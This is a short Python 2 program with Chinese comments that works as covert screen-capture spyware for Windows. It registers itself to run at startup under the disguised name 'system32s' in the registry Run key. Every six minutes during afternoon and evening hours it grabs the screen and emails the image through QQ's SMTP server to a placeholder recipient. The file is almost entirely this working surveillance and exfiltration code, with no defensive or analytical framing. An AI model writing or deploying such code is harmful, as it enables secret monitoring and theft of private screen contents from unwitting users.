# -*- coding: utf-8 -*-
import os
import smtplib
import win32api
import win32con
import threading
import time
import datetime
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

'''
1.定时截屏
2.定时发送截图片到指定位置
3.设置开机自动启动
'''
class Client():

    def __init__(self):
        #开始添加开机自动启动
        try:
            name = 'system32s'  # 要添加的项值名称
            path = os.path.dirname(os.path.realpath(__file__))+'\\system32s.exe'
            # 注册表项名
            KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            # 异常处理
            key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
            win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
            win32api.RegCloseKey(key)
        except Exception,e:
            print "开机设置失败";


    #需要处理的任务
    def job(self):
        #获取当前时间
        hour = int(time.localtime().tm_hour)
        if hour < 12 or hour > 20:
            print "任务超时"
            return
        #截屏
        self.getScreen();

        #定时任务
        self.send()


    #定时器任务
    def timerJob(self):
        self.job()
        global timer
        self.timer=threading.Timer(60*6,self.timerJob)
        self.timer.start()

    #抓取屏幕
    def getScreen(self):
        try:
            im = ImageGrab.grab()
            im.save("C:\\test", 'jpeg')
            print "截图成功"
        except Exception,e:
            print "截图失败"


    #发送邮件
    def send(self):
        sender = '发送者邮箱'
        receivers = '接受者邮箱'
        message =  MIMEMultipart('related')
        subject = '测试图片发送-'+datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        message['Subject'] = subject
        message['From'] = sender
        message['To'] = receivers
        content = MIMEText('<html><body><img src="cid:imageid" alt="imageid"></body></html>','html','utf-8')
        message.attach(content)

        file=open("C:\\test", "rb")
        img_data = file.read()
        file.close()

        img = MIMEImage(img_data)
        img.add_header('Content-ID', 'imageid')
        message.attach(img)

        try:
            server=smtplib.SMTP_SSL("smtp.qq.com",465)
            server.login(sender,"发送者生成码")
            server.sendmail(sender,receivers,message.as_string())
            server.quit()
            print ("邮件发送成功")
        except smtplib.SMTPException as e:
            print(e)

if __name__=='__main__':
    client=Client();
    timer = threading.Timer(60*6, client.timerJob)
    timer.start()